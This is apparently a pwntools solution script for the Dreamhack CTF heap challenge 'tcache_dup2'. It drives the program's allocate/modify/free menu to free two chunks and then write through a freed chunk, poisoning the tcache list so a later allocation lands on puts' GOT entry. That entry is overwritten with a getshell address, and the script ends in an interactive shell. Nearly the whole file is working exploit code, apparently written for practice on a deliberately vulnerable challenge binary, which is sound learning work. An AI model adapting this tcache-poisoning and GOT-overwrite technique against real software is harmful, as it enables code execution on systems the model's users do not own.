from pwn import *
elf =  ELF("./tcache_dup2_patched")
libc = ELF("./libc.so.6")

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:16590'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()


#getshell func
getshell = 0x401530

#ptr table
#.bss: 0x4040A0 ptr  

#gdb.attach(p)

def create(size, data):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    #size
    p.recvuntil(b": ")
    p.sendline(size)
    #data
    p.recvuntil(b": ")
    p.send(data)

#up to 0x10 bytes only
def modify(idx, size, data):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    
    p.recvuntil(b": ")
    p.sendline(idx)
    
    p.recvuntil(b": ")
    p.sendline(size)
    
    p.recvuntil(b": ")
    p.send(data)

def delete(idx):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    
    p.recvuntil(b": ")
    p.sendline(idx)


create(b"24", b"AAAA")
create(b"24", b"BBBB")
#modify available chiar si pe freed chunks(?)

#so its going to think that the tcache isnt empty. if we free then malloc, its going to think its empty
#so now we create another dummy entrance, 1 
delete(b"1")
#this will be the head though
delete(b"0")

puts_got = elf.got[b'puts']
modify(b"0", b"16", p64(puts_got))

#this will write inside the A chunk (head), and now FD->evil
create(b"24", b"CCCC")
#one more slot left (for B), but head pointing to evil not B.
create(b"24", p64(getshell))

p.interactive()
